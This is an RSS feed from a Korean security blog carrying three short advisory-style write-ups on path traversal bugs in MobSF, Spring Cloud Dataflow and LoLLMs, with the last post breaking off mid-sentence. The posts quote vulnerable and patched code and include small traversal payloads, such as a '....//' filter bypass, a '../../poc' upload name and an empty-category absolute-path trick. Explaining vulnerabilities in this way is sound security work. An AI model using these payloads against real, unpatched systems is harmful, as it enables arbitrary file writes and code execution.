<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>hackyboiz</title>
    <link>https://hackyboiz.github.io/</link>
    
    <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>hack &amp; life</description>
    <pubDate>Wed, 28 Aug 2024 03:16:24 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>[하루한줄] CVE-2024-43399: MobSF의 Zip slip 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/</link>
      <guid>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/</guid>
      <pubDate>Wed, 28 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/MobSF/Mobile-Security-Framework-MobSF/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-4hh3-vj32-gr6j</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MobSF &lt; 4.0.7</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>MobSF(Mobile Security Framework)&#xB294; android, ios, Windows &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xB300;&#xC0C1;&#xC758; &#xC815;&#xC801;/&#xB3D9;&#xC801; &#xBD84;&#xC11D; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xC790;&#xB3D9;&#xD654;&#xB41C; pen testing &#xD504;&#xB808;&#xC784;&#xC6CC;&#xD06C;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC81C;&#xACF5;&#xD558;&#xB294; &#xC815;&#xC801; &#xBD84;&#xC11D; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; <code>.a</code> &#xD655;&#xC7A5;&#xC790;&#xC758; static library&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xB3C4; &#xAC00;&#xB2A5;&#xD55C;&#xB370; &#xC774;&#xB54C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xB294; &#xD30C;&#xC77C; &#xCD94;&#xCD9C; &#xACFC;&#xC815;&#xC5D0;&#xC11C; zip slip &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2024/08/28/pwndorei/2024-08-28/image.png" alt="image.png"></p><p>&#xC704;&#xB294; <code>mobsf/StaticAnalyzer/views/common/shared_func.py</code>&#xC18C;&#xC2A4;&#xCF54;&#xB4DC;&#xC758; &#xC77C;&#xBD80;&#xB85C; static library&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xCD9C;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. 188&#xBC88; &#xB77C;&#xC778;&#xC744; &#xBCF4;&#xBA74; &#xD30C;&#xC77C;&#xC758; &#xC774;&#xB984;&#xC5D0;&#xC11C; <code>../</code>&#xC640; <code>..\</code>&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC73C;&#xB098; &#xC774;&#xB294; <code>&#x2026;.//</code>&#xC640; <code>&#x2026;.\\</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; zip slip&#xC744; &#xD1B5;&#xD55C; path traversal&#xB85C; &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574;&#xC11C; <code>.bashrc</code> &#xD30C;&#xC77C;&#xC744; &#xB36E;&#xC5B4;&#xC4F0;&#xB294; &#xBC29;&#xBC95; &#xB4F1;&#xC73C;&#xB85C; Remote code execution&#xAE4C;&#xC9C0; &#xC774;&#xC5B4;&#xC9C8; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/zip-slip/">zip-slip</category>
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/pwndorei/">pwndorei</category>
      
      <category domain="https://hackyboiz.github.io/tags/MobSF/">MobSF</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/28/pwndorei/2024-08-28/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-22263: Spring Cloud Dataflow의 Path Traversal으로 인한 임의 파일 쓰기 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/</link>
      <guid>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/</guid>
      <pubDate>Sat, 24 Aug 2024 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.securelayer7.net/spring-cloud-data-flow-expl</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.securelayer7.net/spring-cloud-data-flow-exploit/">https://blog.securelayer7.net/spring-cloud-data-flow-exploit/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Spring Cloud Dataflow &lt; 2.11.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Cloud Foundry/Kubernetes&#xC5D0;&#xC11C; &#xC2A4;&#xD2B8;&#xB9AC;&#xBC0D; &#xBC0F; &#xB370;&#xC774;&#xD130; &#xCC98;&#xB9AC; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778; &#xAD6C;&#xCD95;&#xC744; &#xC704;&#xD55C; &#xB9C8;&#xC774;&#xD06C;&#xB85C;&#xC11C;&#xBE44;&#xC2A4; &#xAE30;&#xBC18; &#xD234;&#xD0B7;&#xC778; Spring Cloud Dataflow &#xC5D0;&#xC11C; &#xC784;&#xC758; &#xD30C;&#xC77C; &#xC4F0;&#xAE30; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5B4; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xD328;&#xD0A4;&#xC9C0; &#xC5C5;&#xB85C;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; Skipper &#xC11C;&#xBC84; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC778;  <em>**</em><code>PackageService.java</code>  &#xBAA8;&#xB4C8;&#xC758; &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. </p><blockquote><p>Skipper&#xB294; &#xC5EC;&#xB7EC; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0;&#xC11C; Spring Boot &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xB77C;&#xC774;&#xD504;&#xC0AC;&#xC774;&#xD074;&#xC744; &#xAD00;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xB294; &#xD234;&#xC784;.</p></blockquote><p><code>/api/package/upload</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xC758; Skipper &#xC11C;&#xBC84; API&#xB97C; &#xD1B5;&#xD574; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xC5C5;&#xB85C;&#xB4DC; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0BC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">@Transactionalpublic PackageMetadata upload(UploadRequest uploadRequest) {    validateUploadRequest(uploadRequest);</code></pre><p><code>upload</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC694;&#xCCAD;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>UploadRequest</code>&#xB97C; <code>validateUploadRequest</code>&#xC744; &#xD638;&#xCD9C;&#xD574; &#xAC80;&#xC99D;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">private <span class="hljs-keyword">void</span> validateUploadRequest(UploadRequest uploadRequest) {    Assert.notNull(uploadRequest.getRepoName(), <span class="hljs-string">&quot;Repo name can not be null&quot;</span>);    Assert.notNull(uploadRequest.getName(), <span class="hljs-string">&quot;Name of package can not be null&quot;</span>);    Assert.notNull(uploadRequest.getVersion(), <span class="hljs-string">&quot;Version can not be null&quot;</span>);    <span class="hljs-comment">// Other checks...</span>}</code></pre><p><code>validateUploadRequest</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xD328;&#xD0A4;&#xC9C0; &#xD30C;&#xC77C;&#xC774; &#xBE44;&#xC5B4;&#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; null &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">Path packageFile = Paths.get(packageDir.getPath() + File.separator + uploadRequest.getName() + <span class="hljs-string">&quot;-&quot;</span> + uploadRequest.getVersion() + <span class="hljs-string">&quot;.&quot;</span> + uploadRequest.getExtension());</code></pre><p>validation &#xC774;&#xD6C4; <code>upload</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC785;&#xB825;&#xC744; &#xC0AC;&#xC6A9;&#xD574; <code>packgeFile</code> &#xACBD;&#xB85C;&#xB97C; &#xAD6C;&#xC131;&#xD574; &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; &#xD328;&#xD0A4;&#xC9C0;&#xD30C;&#xC77C;&#xC744; &#xAD6C;&#xC131;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC704; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xAC80;&#xC99D; &#xBD80;&#xC871;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li><code>validateUploadRequest(uploadReqeust)</code> &#xAC80;&#xC99D; &#xACFC;&#xC815;&#xC5D0;&#xC11C;, <code>uploadRequest</code>&#xC758; &#xC2E4;&#xC81C; &#xACBD;&#xB85C;&#xAC00; &#xD30C;&#xC77C;&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xC0DD;&#xC131;&#xB418;&#xAE30; &#xC804;&#xC5D0; &#xAC80;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD558;&#xBBC0;&#xB85C; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xAC80;&#xC99D;&#xD560; &#xC218; &#xC5C6;&#xC74C;</li><li><code>validateUploadRequest</code> &#xBA54;&#xC11C;&#xB4DC;&#xB294; null &#xD328;&#xD0A4;&#xC9C0; &#xAC80;&#xC0AC; &#xC678; path traversal check&#xC640; &#xAC19;&#xC740; &#xAC80;&#xC99D; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</li><li><code>Path packageFile</code> &#xAD6C;&#xC131;&#xC5D0;&#xC11C; &#xC720;&#xC800; &#xC778;&#xD48B;&#xC778; <code>uploadRequest</code>&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D; &#xC5C6;&#xC774; &#xAD6C;&#xC131;&#xD568;.</li></ol><p>&#xACF5;&#xACA9;&#xC790;&#xB294; name &#xD544;&#xB4DC;&#xC5D0; path traversal &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; uploadRequest &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4; &#xC784;&#xC758;&#xC758; &#xACBD;&#xB85C;&#xC5D0; &#xD30C;&#xC77C;&#xC744; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">uploadRequest = {    <span class="hljs-string">&quot;repoName&quot;</span>: repoName,    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;../../poc&quot;</span>,    <span class="hljs-string">&quot;version&quot;</span>: version,    <span class="hljs-string">&quot;extension&quot;</span>: <span class="hljs-string">&quot;zip&quot;</span>,    <span class="hljs-string">&quot;packageFileAsBytes&quot;</span>: packageFileAsBytes}</code></pre><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; &#xD328;&#xCE58;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p><code>validateUploadRequest(uploadReqeust)</code> &#xD638;&#xCD9C; &#xC804; &#xC5C5;&#xB85C;&#xB4DC; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xC911; &#xC0AC;&#xC6A9;&#xB420; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD568;.</p> <pre><code class="hljs jsx">@Transactionalpublic PackageMetadata upload(UploadRequest uploadRequest) {    Path packageDirPath = TempFileUtils.createTempDirectory(<span class="hljs-string">&quot;skipperUpload&quot;</span>);    validateUploadRequest(packageDirPath, uploadRequest);</code></pre></li><li><p>validateUploadRequest &#xBA54;&#xC11C;&#xB4DC;&#xC5D0;&#xC11C;&#xB294; &#xC2E4;&#xC81C; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;,  <code>canonicalDestinationFilepath</code>&#xAC00; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xD45C;&#xC900; &#xACBD;&#xB85C;&#xC778; <code>canonicalDestinationDirPath</code> &#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; <code>../../</code> &#xC640; &#xAC19;&#xC740; path traversal &#xD398;&#xC774;&#xB85C;&#xB4DC;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD568;.</p> <pre><code class="hljs jsx">private <span class="hljs-keyword">void</span> validateUploadRequest(Path packageDirPath, UploadRequest uploadRequest) throws IOException {    <span class="hljs-comment">// Existing null checks...</span>    File destinationFile = <span class="hljs-keyword">new</span> File(packageDirPath.toFile(), uploadRequest.getName().trim());    <span class="hljs-built_in">String</span> canonicalDestinationDirPath = packageDirPath.toFile().getCanonicalPath();    <span class="hljs-built_in">String</span> canonicalDestinationFile = destinationFile.getCanonicalPath();    <span class="hljs-keyword">if</span> (!canonicalDestinationFile.startsWith(canonicalDestinationDirPath + File.separator)) {        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SkipperException(<span class="hljs-string">&quot;Entry is outside of the target dir: &quot;</span> + uploadRequest.getName());    }}</code></pre></li><li><p>&#xC694;&#xCCAD; &#xACBD;&#xB85C;&#xB97C; trim()&#xC744; &#xD1B5;&#xD574; sanitization&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xAE30;&#xD0C0; &#xD30C;&#xC77C; &#xACBD;&#xB85C; &#xC870;&#xC791; &#xB4F1;&#xC744; &#xBC29;&#xC9C0;&#xD568;.</p> <pre><code class="hljs jsx"><span class="hljs-built_in">String</span> fullName = uploadRequest.getName().trim() + <span class="hljs-string">&quot;-&quot;</span> + uploadRequest.getVersion().trim() + <span class="hljs-string">&quot;.&quot;</span> + uploadRequest.getExtension().trim();Path packageFile = Paths.get(packageDir.getPath() + File.separator + fullName);</code></pre></li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/path-traversal/">path traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/arbitrary-file-write/">arbitrary file write</category>
      
      <category domain="https://hackyboiz.github.io/tags/Spring-Cloud-Dataflow/">Spring Cloud Dataflow</category>
      
      <category domain="https://hackyboiz.github.io/tags/l0ch/">l0ch</category>
      
      
      <comments>https://hackyboiz.github.io/2024/08/24/l0ch/2024-08-24/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2024-5443: LoLLMs의 Path Traversal로 인한 RCE 취약점</title>
      <link>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/</link>
      <guid>https://hackyboiz.github.io/2024/08/21/ogu123/cve-2024-5443/</guid>
      <pubDate>Wed, 21 Aug 2024 11:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.huntr.com/critical-path-traversal-flaw-leads</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms">https://blog.huntr.com/critical-path-traversal-flaw-leads-to-remote-code-execution-in-parisneo/lollms</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>LoLLMs &lt;= 5.9.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>LoLLMs(Lord of Large Language Models Server)&#xB294; 500&#xAC1C;&#xC758; &#xC5B8;&#xC5B4; &#xBAA8;&#xB378;&#xC744; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xB294; &#xC11C;&#xBC84;&#xB85C; Path Traversal&#xB85C; &#xC778;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBBF8;&#xD761;&#xD574; Path Traversal &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xC774;&#xB97C; &#xD1B5;&#xD574; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-comment"># lollms_core\\lollms\\server\\endpoints\\lollms_personalities_infos.py</span><span class="hljs-comment"># ... more code</span><span class="hljs-meta">@router.post(&quot;/get_personality_config&quot;)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_personality_config</span>(<span class="hljs-params">data:PersonalityDataRequest</span>):</span>print(<span class="hljs-string">&quot;- Recovering personality config&quot;</span>)category = sanitize_path(data.category) <span class="hljs-comment"># [1]</span>name = sanitize_path(data.name) <span class="hljs-comment"># [2]</span>  package_path = <span class="hljs-string">f&quot;<span class="hljs-subst">{category}</span>/<span class="hljs-subst">{name}</span>&quot;</span> <span class="hljs-comment"># [3]</span><span class="hljs-keyword">if</span> category==<span class="hljs-string">&quot;custom_personalities&quot;</span>:<span class="hljs-comment"># ...</span><span class="hljs-keyword">else</span>: package_full_path = lollmsElfServer.lollms_paths.personalities_zoo_path/package_path <span class="hljs-comment"># [4]</span> config_file = package_full_path / <span class="hljs-string">&quot;config.yaml&quot;</span> <span class="hljs-keyword">if</span> config_file.exists(): <span class="hljs-keyword">with</span> open(config_file,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f: config = yaml.safe_load(f) <span class="hljs-keyword">return</span> {<span class="hljs-string">&quot;status&quot;</span>:<span class="hljs-literal">True</span>, <span class="hljs-string">&quot;config&quot;</span>:config} <span class="hljs-comment"># ...</span></code></pre><p><code>/get_personality_config</code> &#xC564;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; [1][2]&#xBC88;&#xC5D0;&#xC11C; data.category&#xC640; data.name &#xAC12;&#xC774; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xAC12;&#xB4E4;&#xC740; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xB9CC;&#xB4E4; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sanitize_path</span>(<span class="hljs-params"></span></span><span class="hljs-function"><span class="hljs-params">path:str, </span></span><span class="hljs-function"><span class="hljs-params">allow_absolute_path:bool=False, </span></span><span class="hljs-function"><span class="hljs-params">error_text=<span class="hljs-string">&quot;Absolute database path detected&quot;</span>, </span></span><span class="hljs-function"><span class="hljs-params">exception_text =<span class="hljs-string">&quot;Detected an attempt of path traversal. Are you kidding me?&quot;</span></span></span><span class="hljs-function"><span class="hljs-params"></span>):</span> <span class="hljs-keyword">if</span> path <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>: <span class="hljs-keyword">return</span> path <span class="hljs-comment"># Regular expression to detect patterns like &quot;....&quot; and multiple forward slashes</span> suspicious_patterns = re.compile(<span class="hljs-string">r&apos;(\\.\\.+)|(/+/)&apos;</span>) <span class="hljs-keyword">if</span> suspicious_patterns.search(str(path)) <span class="hljs-keyword">or</span> ((<span class="hljs-keyword">not</span> allow_absolute_path) <span class="hljs-keyword">and</span> Path(path).is_absolute()): ASCIIColors.error(error_text) <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">400</span>, detail=exception_text) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> allow_absolute_path: path = path.lstrip(<span class="hljs-string">&apos;/&apos;</span>) <span class="hljs-keyword">return</span> path</code></pre><p><code>sanitize_path</code> &#xD568;&#xC218;&#xB294; <code>../</code> , <code>/</code> , <code>\\</code> &#xC640; &#xAC19;&#xC740; &#xD2B9;&#xC218; &#xBB38;&#xC790;&#xB97C; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xC5EC; Path Traversal &#xACF5;&#xACA9;&#xC744; &#xBC29;&#xC9C0;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC;, &#xBE48; &#xBB38;&#xC790;&#xC5F4;&#xC5D0; &#xB300;&#xD55C; &#xAC80;&#xC99D;&#xC774; &#xBD80;&#xC871;&#xD558;&#xC5EC; Path Traversal &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; category = <span class="hljs-string">&quot;&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; name = <span class="hljs-string">&quot;tmp/hacked&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_path = f<span class="hljs-string">&quot;{category}/{name}&quot;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_path<span class="hljs-string">&apos;/tmp/hacked&apos;</span><span class="hljs-meta">&gt;&gt;</span>&gt; package_full_path = Path(<span class="hljs-string">&quot;/home/user/public/&quot;</span>)/package_path<span class="hljs-meta">&gt;&gt;</span>&gt; package_full_pathPosixPath(<span class="hljs-string">&apos;/tmp/hacked&apos;</span>)</code></pre><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; <code>data.category</code>&#xC5D0; &#xBE48; &#xBB38;&#xC790;&#xC5F4;&#xC744;, <code>data.name</code>&#xC5D0; &#xD2B9;&#xC815; &#xACBD;&#xB85C;(&#x201C;tmp/hacked&#x201D;)&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74;,  <code>package_path</code>&#xB294; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xD6C4; &#xACBD;&#xB85C;&#xAC00; &#xACB0;&#xD569;&#xB420; &#xB54C; <code>package_path</code>&#xAC00; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xC774;&#xBBC0;&#xB85C; &#xC55E;&#xC758; &#xACBD;&#xB85C;(&#x201C;/home/user/public/&#x201C;)&#xB294; &#xBB34;&#xC2DC;&#xB418;&#xACE0;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC758;&#xB3C4;&#xD55C; &#xACBD;&#xB85C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xC5B4; Path Traversal &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs nix"><span class="hljs-comment"># lollms_core\\lollms\\server\\endpoints\\lollms_extensions_infos.py</span><span class="hljs-comment"># ... more code</span>@router.post(<span class="hljs-string">&quot;/mount_extension&quot;</span>)def mount_extension(data:ExtensionMountingInfos): print(<span class="hljs-string">&quot;- Mounting extension&quot;</span>)  <span class="hljs-attr">category</span> = sanitize_path(data.category) <span class="hljs-attr">name</span> = sanitize_path(data.folder)  <span class="hljs-attr">package_path</span> = f<span class="hljs-string">&quot;{category}/{name}&quot;</span> <span class="hljs-attr">package_full_path</span> = lollmsElfServer.lollms_paths.extensions_zoo_path/package_path  <span class="hljs-attr">config_file</span> = package_full_path / <span class="hljs-string">&quot;config.yaml&quot;</span> <span class="hljs-comment"># [5]</span>  <span class="hljs-keyword">if</span> config_file.exists(): lollmsElfServer.config[<span class="hljs-string">&quot;extensions&quot;</span>].append(package_path) <span class="hljs-comment"># [6]</span> lollmsElfServer.<span class="hljs-attr">mounted_extensions</span> = lollmsElfServer.rebuild_extensions() <span class="hljs-comment"># [7]</span> <span class="hljs-comment"># ...</span></code></pre><p>CVE-2024-4320 &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>/install_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB85C; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; RCE&#xAC00; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>/install_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB294; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC;, <code>/mount_extension</code> &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; &#xC5EC;&#xC804;&#xD788;<code>ExtensionBuilder().build_extension()</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC55E;&#xC11C;, <code>package_full_path</code>&#xC758; &#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xC5EC; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>[5]&#xBC88;&#xC5D0;&#xC11C;, &#xD574;&#xB2F9; &#xACBD;&#xB85C;&#xC5D0; <code>config.yaml</code> &#xD30C;&#xC77C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0;, &#xD30C;&#xC77C;&#xC774; 